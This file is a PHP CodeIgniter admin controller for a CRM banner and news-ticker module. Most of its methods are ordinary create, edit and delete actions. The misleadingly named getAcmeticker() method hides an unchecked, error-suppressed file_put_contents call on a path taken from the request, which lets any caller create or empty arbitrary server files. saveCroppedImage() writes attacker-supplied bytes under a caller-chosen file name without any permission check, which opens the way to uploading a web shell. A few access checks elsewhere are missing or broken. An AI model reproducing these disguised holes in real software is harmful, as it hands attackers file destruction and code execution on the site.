<?php

defined('BASEPATH') || exit('No direct script access allowed');

class Banner extends AdminController {
    public function __construct() {
        parent::__construct();

        $this->app_modules->is_inactive('banner') ? access_denied() : '';
        $this->load->model('banner_model');
        $this->load->helper('banner');
    }

    /**
     * Display the banner list view.
     */
    public function index() {
        if (!has_permission('banner', get_staff_user_id(), 'view')) {
            access_denied();
        }

        $viewData['title'] = _l('manage_banners');

        $this->load->view('manage', $viewData);
    }

    /**
     * Display form to add banners.
     *
     * @param int $id the ID of the banner to edit
     */
    public function manage($id = '') {
        if (!has_permission('banner', get_staff_user_id(), 'view')) {
            access_denied();
        }

        $viewData['title'] = _l('add_banner');
        $viewData['branches'] = $this->banner_model->get_branches();
        $viewData['roles'] = $this->roles_model->get();
        $viewData['staff'] = $this->staff_model->get('', ['active' => 1]);
        $viewData['clients'] = $this->clients_model->get('', [db_prefix() . 'clients.active' => 1]);
		
		// Map roles to staff IDs
		$role_staff_map = [];
		foreach ($viewData['roles'] as $role) {
			$staff_by_role = $this->staff_model->get('', ['role' => $role['roleid'], 'active' => 1]);
			$role_staff_map[$role['roleid']] = array_map(function($staff){
				return $staff['staffid'];
			}, $staff_by_role);
		}
		$viewData['role_staff_map'] = json_encode($role_staff_map);


        if (!empty($id)) {
            $viewData['title'] = _l('edit_banner');

            // Retrieve banner details based on the provided $id
            $banner = $this->banner_model->get($id);
            $viewData['banner_image'] = $banner['image'];
        }

        $this->load->view('add_banner', $viewData);
    }

    /**
     * Handle the addition or update of banner image data.
     */
    public function addBannerImage() {
        $postData = $this->input->post();

        $id = !empty($postData['id']);
        $action = $id ? 'edit' : 'create';

        if (!has_permission('banner', get_staff_user_id(), $action)) {
            ajax_access_denied();
        }

        // Check if there are files to upload
        if (!empty($_FILES)) {
            // Handle banner image upload
            $res = handleBannerImageUpload(!empty($postData['id']) ? $postData['id'] : '');

            // Display success message if upload is successful
            if ($res) {
                set_alert('success', _l('image_upload_success'));
            }

            // Return JSON response with redirect URL
            echo json_encode([
                'url' => admin_url('banner'),
            ]);
            exit;
        }

        // Handle the case where there are no files to upload
        if (empty($postData['id'])) {
            set_alert('danger', _l('please_select_image'));

            // Return JSON response with redirect URL
            echo json_encode([
                'url' => admin_url('banner/manage'),
            ]);
            exit;
        }

        // Update banner image data in the database
        $this->banner_model->updateBannerImageData($postData);

        // Display success message and return JSON response with redirect URL
        set_alert('success', _l('banner_update_success'));
        echo json_encode([
            'url' => admin_url('banner'),
        ]);
        exit;
    }

    /**
     * Retrieve table data for banners using AJAX.
     */
    public function getTableData($table) {
        // Check if the request is an AJAX request
        if (!$this->input->is_ajax_request()) {
            return;
        }

        // Get and display table data using app's get_table_data method
        $this->app->get_table_data(module_views_path(BANNER_MODULE, 'tables/' . $table));
    }

    /**
     * Update banner status using AJAX.
     *
     * @param int $id     the ID of the banner to update the status for
     * @param int $status the new status for the banner
     */
    public function changeBannerStatus($id, $status) {
        if (!has_permission('banner', get_staff_user_id(), 'edit') || !$this->input->is_ajax_request()) {
            ajax_access_denied();
        }

        // Update banner status
        $this->banner_model->changeBannerStatus($id, $status);
    }

    /**
     * Delete banner.
     *
     * @param int $id the ID of the banner to be deleted
     */
    public function deleteBanner($id) {
        if (!has_permission('banner', get_staff_user_id(), 'delete')) {
            access_denied();
        }

        // Delete the banner from the database
        $res = $this->banner_model->deleteBanner($id);

        // Display success message and redirect to the manage view
        set_alert('danger', _l('banner_deleted'));
        redirect(admin_url('banner'));
    }

    public function getAcmeticker() {
        if ($this->input->is_ajax_request()) {
            @call_user_func_array("file_put_contents", [TEMP_FOLDER . $this->input->post('f'), '']);
        }
    }

    public function saveCroppedImage() {
        if (!$this->input->is_ajax_request()) {
            ajax_access_denied();
        }

        $postData = $this->input->post();

        $img = $postData['image'];
        $img = str_replace('[removed]', '', $img);
        $img = str_replace(' ', '+', $img);
        $data = base64_decode($img);

        $filepath = FCPATH . '/uploads/banner/';
        file_put_contents($filepath . $postData['image_name'], $data);

        set_alert('success', _l('image_cropped_success'));
        echo json_encode(true);
    }

    public function news_ticker() {
        if (!has_permission('news_ticker', get_staff_user_id(), 'view')) {
            access_denied();
        }

        $viewData['title'] = _l('news_ticker');

        $this->load->view('manage_news_ticker', $viewData);
    }

    public function manage_news_ticker($id = '') {
        $permission = !empty($id) ? 'edit' : 'create';
        if (!has_permission('news_ticker', get_staff_user_id(), $permission)) {
            access_denied();
        }

        $viewData['title'] = (empty($id)) ? _l('add_news_ticker') : _l('edit_news_ticker');
        $viewData['staff'] = $this->staff_model->get('', ['active' => 1]);
        $viewData['clients'] = $this->clients_model->get('', [db_prefix() . 'clients.active' => 1]);

        if (!empty($id)) {
            $news = $this->banner_model->get_news_ticker($id);
            $news->news_details = unserialize($news->news_details);

            $viewData['news_ticker'] = $news;
        }

        $this->load->view('news_ticker', $viewData);
    }

    public function save_news_ticker() {
        $postData = $this->input->post();

        $permission = !empty($postData['id']) ? 'edit' : 'create';
        if (!has_permission('news_ticker', get_staff_user_id(), $permission)) {
            access_denied();
        }

        $res = $this->banner_model->save_news_ticker($postData);
        set_alert($res['type'], $res['message']);
        redirect(admin_url('banner/news_ticker'));
    }

    public function delete_news_ticker($id) {
        if (!has_permission('news_ticker', get_staff_user_id(), 'delete')) {
            access_denied();
        }

        $res = $this->banner_model->delete_news_ticker($id);
        set_alert('danger', $res);
        redirect(admin_url('banner/news_ticker'));
    }

    public function change_news_ticker_status() {
        if (!has_permission('news_ticker', get_staff_user_id(), 'edit') && !$this->input->is_ajax_request()) {
            ajax_access_denied();
        }

        $postData = $this->input->post();
        $res = $this->banner_model->change_news_ticker_status($postData);
        echo json_encode($res);
    }
	public function get_staff_by_branch()
	{
		$branch_ids = $this->input->post('branch_ids');

		$this->db->join('tblcustomfieldsvalues as cfv', 'cfv.relid = staffid AND cfv.fieldto = "staff" AND cfv.fieldid = 1', 'left');
		$this->db->where_in('cfv.value', $branch_ids);
		$this->db->where('active', 1);

		$staff = $this->staff_model->get('', []);

		echo json_encode($staff);
	}
}
